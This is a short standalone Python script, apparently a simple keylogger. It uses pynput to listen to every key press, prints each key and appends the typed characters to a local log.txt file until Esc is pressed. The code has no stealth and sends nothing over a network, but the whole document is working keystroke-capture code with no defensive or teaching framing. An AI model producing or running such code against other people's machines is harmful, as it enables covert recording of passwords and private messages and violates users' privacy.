#!/usr/bin/env python
from pynput.keyboard import Key, Listener
from pathlib import Path

# Global variables
LOG_FILE_NAME = "log.txt"
LOG_PATH = Path(LOG_FILE_NAME)

# If file doesn't exist, create it
if not LOG_PATH.is_file():
    f = open(LOG_FILE_NAME, "w")
    f.close()


def on_press(key):
    print('{0} pressed'.format(key))
    write_file(key)


def on_release(key):
    # stop listener on pressing esc
    if key == Key.esc:
        return False


def write_file(key):
    with open(LOG_FILE_NAME, "a") as f:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)


# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
